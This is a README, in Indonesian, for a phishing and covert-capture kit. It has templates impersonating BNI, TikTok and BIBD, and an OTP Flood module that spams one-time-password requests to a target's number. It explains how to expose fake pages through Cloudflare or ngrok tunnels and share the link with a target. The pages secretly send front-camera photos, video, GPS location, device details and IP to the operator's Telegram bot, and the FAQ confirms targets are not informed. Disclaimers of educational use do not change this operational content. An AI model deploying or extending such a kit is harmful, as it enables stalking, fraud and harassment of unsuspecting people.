```
  ███╗   ███╗ ███████╗ ████████╗ █████╗  ██████╗ ██╗   ██╗ ████████╗ ███████╗ ██████╗  ██╗  ██╗
  ████╗ ████║ ██╔════╝ ╚══██╔══╝ ██╔══██╗ ██╔════╝ ╚██╗ ██╔╝ ╚══██╔══╝ ██╔════╝ ██╔════╝  ██║  ██║
  ██╔████╔██║ █████╗      ██║    ███████║ ██║       ╚████╔╝     ██║    █████╗   ██║      ███████║
  ██║╚██╔╝██║ ██╔══╝      ██║    ██╔══██║ ██║        ╚██╔╝      ██║    ██╔══╝   ██║      ██╔══██║
  ██║ ╚═╝ ██║ ███████╗    ██║    ██║  ██║ ╚██████╗    ██║       ██║    ███████╗ ╚██████╗ ██║  ██║
  ╚═╝     ╚═╝ ╚══════╝    ╚═╝    ╚═╝  ╚═╝  ╚═════╝    ╚═╝       ╚═╝    ╚══════╝  ╚═════╝ ╚═╝  ╚═╝
```
# METACYTECH Tools

Platform simulasi phishing dan social engineering awareness multi-template.

**Multi Template:** BNI / TikTok / BIBD / OTP Flood  
**Fitur Baru:** TikTok Custom Title, Capture Dipercepat, Auto Tunnel + CA Repair  
**Teknologi:** Cloudflare Tunnel / Telegram / Next.js

> [!WARNING]
> **DISCLAIMER PENTING**
>
> Tool ini dibuat untuk tujuan **edukasi, security awareness training, dan authorized penetration testing**.
> Penggunaan tool ini tanpa izin tertulis dari target adalah **ILEGAL** dan dapat dikenai sanksi hukum
> (UU ITE Pasal 30-35, Computer Fraud and Abuse Act, GDPR, dan hukum lainnya).
>
> **Anda bertanggung jawab penuh atas segala penggunaan tool ini.**

## Fitur

- **Multi-template system** — BNI, TikTok, BIBD, OTP Flood
- **TikTok Custom Title** — ganti title URL bebas (ditanya tiap pilih template TikTok)
- **TikTok Tab Icon** — logo TikTok sebagai favicon browser (logo-tiktok-new.png)
- **UI Premium** — background hitam, logo besar, animasi hidup
- **One-click deploy** — Build Next.js + Cloudflare Tunnel / ngrok
- **Auto URL update** — metadataBase otomatis mengikuti tunnel URL
- **Camera & Location capture** — capture paralel (foto + video simultan), resolusi 640×480 untuk kecepatan
- **Capture cepat** — GPS timeout 4 detik, foto dalam 300ms, kirim paralel via Telegram
- **Telegram integration** — pengiriman data real-time
- **OTP Flood mode** — spam OTP multi-brand
- **Cross-platform** — Windows & Termux support
- **Auto fallback** — ngrok jika Cloudflare Tunnel gagal
- **Auto CA Repair** — Termux TLS certificate otomatis diperbaiki saat error
- **TLS Safety Net** — `NODE_TLS_REJECT_UNAUTHORIZED=0` di Termux untuk kompatibilitas Node.js
- **Premium terminal UI** — animasi bersih di stderr, output rapi di stdout, format URL `[v]`

## Persyaratan

| Komponen | Minimum |
|----------|---------|
| Python | 3.13+ |
| Node.js | 20.x+ |
| NPM | 10.x+ |
| Cloudflared | 2026+ (opsional, auto fallback ke ngrok) |
| OS | Windows 10+ / Termux (Android) |

> [!TIP]
> **Punya HP Android?** Baca panduan Termux lengkap:
> [📱 RUN_GUIDE.md — Instalasi Termux dari Nol](RUN_GUIDE.md)
> Termasuk install Python, Node.js, Git, Cloudflared, setup Telegram, langkah demi langkah.

### Install Cloudflared

**Windows:** Download dari [developers.cloudflare.com](https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/downloads/) dan install ke `C:\Program Files (x86)\cloudflared\`

**Termux:**
```bash
pkg install cloudflared -y
```

### Setup Telegram Bot

1. Chat [@BotFather](https://t.me/BotFather) di Telegram
2. Kirim `/newbot` dan ikuti instruksi
3. Dapatkan **Bot Token** (format: `123456:ABC-DEF...`)
4. Buat grup, tambahkan bot sebagai admin
5. Kirim pesan ke grup, lalu kunjungi `https://api.telegram.org/bot<TOKEN>/getUpdates`
6. Dapatkan **Chat ID** dari response JSON

Buat file `.env.local` di root project:
```env
TELEGRAM_BOT_TOKEN=123456:ABC-DEF...
TELEGRAM_CHAT_ID=-100123456789
```

## Cara Penggunaan

### Jalankan Launcher

**Windows:**
```bash
run.bat
```

Atau manual:
```bash
python launcher.py
```

**Termux:**
```bash
cd ~/metacytech-tools
bash run.sh
```

### Alur Kerja

Saat pertama kali run, pilih template:

```
  Pilih template:
  [1] BNI  Transfer Bank
  [2] TikTok  Video Share Link
  [3] BIBD  Bank Brunei Darussalam
  [4] OTP Flood  Multi-Brand Spam

  Pilih template (1-4):
```

**Jika pilih TikTok**, akan muncul prompt title URL:

```
  Template TikTok - Masukkan Title URL kamu
  Contoh: TikTok - ChatGpt Pro Free
  atau biarkan kosong untuk default: TikTok - ChatGpt Pro Free

  Title URL:
```

Title ini akan otomatis dipakai di **Page Title, OpenGraph, Twitter Card,** dan semua metadata halaman. Biarkan kosong untuk pakai default.

### Tampilan TikTok Terbaru

- **Halaman awal:** Logo TikTok besar di tengah background hitam
- **Popup verifikasi:** Logo TikTok besar di gradien pink-cyan, background hitam
- **Animasi loading:** Logo bernafas (pulse) + ring berputar + circular spinner gradien TikTok
- **Tab browser:** Logo TikTok sebagai ikon tab (favicon)

Sistem akan otomatis:

1. Apply template files
2. Build Next.js app (Webpack di Termux, Turbopack di Windows)
3. Start server (port 3000)
4. Start Cloudflare Tunnel (fallback ke ngrok jika perlu)
5. Update metadataBase dengan tunnel URL
6. Rebuild & restart server
7. Tampilkan **PUBLIC URL** untuk dibagikan

**Output terminal:**
```
  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓  ok  applying template

  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓  ok  building

  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓  ok  starting server

  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓  ok  starting tunnel

  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓  ok  rebuilding with url

  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓  ok  rebuilding

  [v] url               : https://xxxx-xxxx-xxxx.trycloudflare.com
  [v] local            : http://localhost:3000
```

### Menu Utama

```
  [1]  Mulai Semua
       Build + Server + Cloudflare Tunnel
  [2]  Hentikan Semua
  [3]  Status
  [4]  Salin URL
  [5]  Ganti Template
  [6]  Keluar

  Pilih menu (1-6):
```

Menu **[5] Ganti Template** juga akan meminta custom title jika switch ke TikTok.

### Mendapatkan Data Target

1. Bagikan **PUBLIC URL** ke target
2. Monitor Telegram — data terkirim real-time saat target:
   - Mengizinkan akses kamera
   - Mengizinkan akses lokasi
3. **Data yang diterima:**
   - Foto dari kamera depan & Video (10 detik)
   - Lokasi GPS (dengan link Google Maps)
   - Info device (OS, browser, RAM, CPU, baterai)
   - IP address & ISP
   - Screen resolution & orientation

## Template Tersedia

| # | Template | Deskripsi | Mode |
|---|----------|-----------|------|
| 1 | BNI | Transfer Bank Verification | Web |
| 2 | TikTok | Video Share Link (kamera + lokasi) **+ Custom Title** | Web |
| 3 | BIBD | Bank Islam Brunei Darussalam | Web |
| 4 | OTP Flood | Spam OTP multi-brand (Paypal, Tinder, Telegram, Flip, Lazada, Netflix, dll) | CLI |

## Troubleshooting

### Cloudflared SSL Certificate Error (Termux)
```
failed to request quick Tunnel: tls: failed to verify certificate
```

**Solusi:** Launcher sekarang auto-repair CA certificates. Jika masih gagal, manual:
```bash
pkg install ca-certificates openssl-tool -y
```

Jika masih gagal, sistem **auto-fallback ke ngrok** (juga auto-install via `pkg`):
```bash
pkg install ngrok -y
```

### Telegram Bot Tidak Mengirim Data (Termux)
Di Termux, Node.js mungkin tidak bisa verify sertifikat Telegram. Launcher sudah set:
- `NODE_EXTRA_CA_CERTS=$PREFIX/etc/tls/cert.pem`
- `NODE_TLS_REJECT_UNAUTHORIZED=0` (safety net)

Pastikan server **direstart** setelah git pull (pilih [2] Hentikan Semua, lalu [1] Mulai Semua).

### TikTok Capture Lambat
Update terbaru sudah optimasi:
- **GPS timeout** 8s → 4s
- **Foto delay** 1500ms → 300ms
- **Resolusi** 1280×720 → 640×480 (lebih cepat upload)
- **Proses paralel:** GPS + IP + stream dijalankan bersamaan
- **Kirim paralel:** foto, video, lokasi dikirim simultan
- **Progress bar** lebih cepat (0.4 detik vs 3 detik)

### "Could not get tunnel URL"

Cek apakah cloudflared/ngrok running:
```bash
ps aux | grep cloudflared
ps aux | grep ngrok
```

Cek tunnel.log:
```bash
cat tunnel.log
```

Test manual cloudflared:
```bash
cloudflared tunnel --url http://localhost:3000
```

### Next.js Build Error (Termux)

Next.js 16 Turbopack tidak support ARM Android. Launcher **auto-downgrade** ke Next.js 15.3.3 dengan Webpack. Jika error:

```bash
rm -rf .next node_modules package-lock.json
npm install --no-bin-links
npm rebuild
```

### Port 3000 Already in Use

**Windows:**
```bash
netstat -ano | findstr :3000
taskkill /PID <PID> /F
```

**Termux:**
```bash
lsof -i :3000
kill -9 <PID>
```

## FAQ

**Q: Apakah tool ini legal?**
A: Ya, untuk security testing dengan **izin tertulis** dan awareness training. Penggunaan tanpa izin adalah **ILEGAL**.

**Q: Apakah target tahu sedang di-test?**
A: Tidak, kecuali Anda memberitahu setelahnya (disarankan untuk ethical testing).

**Q: Data disimpan dimana?**
A: Data dikirim langsung ke bot Telegram Anda. **TIDAK** disimpan di server kami.

**Q: Bisa running 24/7?**
A: Cloudflare Tunnel gratis tidak menjamin uptime 100%. Untuk production, gunakan VPS + domain sendiri.

**Q: Bisa custom title TikTok?**
A: Ya! Setiap pilih template TikTok (di awal atau via menu [5]), kamu akan diminta input title URL.

**Q: Kenapa build lambat di Termux?**
A: Next.js 16 Turbopack tidak support ARM. Sistem auto-downgrade ke Next.js 15 dengan Webpack (lebih lambat tapi stabil).

**Q: Kenapa data tidak terkirim ke Telegram dari Termux?**
A: TLS certificate issue. Launcher sekarang auto-set `NODE_TLS_REJECT_UNAUTHORIZED=0` di Termux. Pull update terbaru dan restart server.

**Q: Cara pakai OTP Flood?**
A: Pilih template [4] OTP Flood, lalu ikuti menu interaktif untuk mengirim OTP ke nomor target.

## Struktur Project

```
metacytech-tools/
├── src/
│   └── app/
│       ├── page.tsx              # Main page (diganti oleh template)
│       ├── layout.tsx            # Root layout
│       └── api/
│           ├── telegram/route.ts # Telegram API endpoint
│           └── capture/route.ts  # Data capture endpoint
├── templates/
│   ├── bni/
│   ├── tiktok/
│   └── bibd/
├── modules/
│   └── otp_flood/
├── public/                       # Static assets
├── launcher.py                   # Main launcher script
├── run.bat                       # Windows launcher
├── run.sh                        # Termux launcher
├── .env.local                    # Environment variables (TIDAK di-commit)
├── package.json                  # Node.js dependencies
├── requirements.txt              # Python dependencies
└── RUN_GUIDE.md                  # Panduan instalasi Termux
```

## Contributing

Kontribusi dipersilakan! Pastikan:
1. Follow ethical guidelines
2. Test thoroughly di Windows & Termux
3. Document semua perubahan
4. Create pull request dengan deskripsi jelas

## License

MIT License — Lihat [LICENSE](LICENSE) untuk detail

## Author

**Iqbal**
- GitHub: [@iqbalgsr46](https://github.com/iqbalgsr46)
- Project: [METACYTECH Tools](https://github.com/iqbalgsr46/metacytech-tools)

## Acknowledgments

- Next.js Team untuk amazing framework
- Cloudflare untuk free tunnel service
- Telegram untuk bot API
- Community untuk feedback & contributions

---

> [!CAUTION]
> **Gunakan dengan bijak dan bertanggung jawab.**
>
> Tool ini untuk Security Research & Awareness. Segala penyalahgunaan di luar tujuan edukasi dan authorized testing adalah tanggung jawab pengguna sepenuhnya.
